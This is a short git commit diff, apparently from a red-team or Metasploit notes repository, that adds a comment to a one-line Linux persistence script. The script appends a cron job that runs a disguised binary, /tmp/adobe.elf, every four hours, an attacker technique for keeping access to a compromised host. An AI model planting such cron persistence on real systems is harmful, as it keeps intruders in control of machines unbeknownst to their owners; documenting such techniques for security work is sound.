df5f8628ef904c9c9be908cb2e8a56736940bfbe
paulkwalton <43542501+paulkwalton@users.noreply.github.com>
2023-07-03 20:28:58 +0100

    Update msf-linux-cron-persistence.sh

--- linux/metasploit/msf-linux-cron-persistence.sh
+++ linux/metasploit/msf-linux-cron-persistence.sh
@@ -1,2 +1,3 @@
+# This command creates a new cron job to execute a script every four hours
 (crontab -l 2>/dev/null; echo "0 */4 * * * /tmp/adobe.elf") | crontab -  # List current cron jobs, add new job, update cron table
 
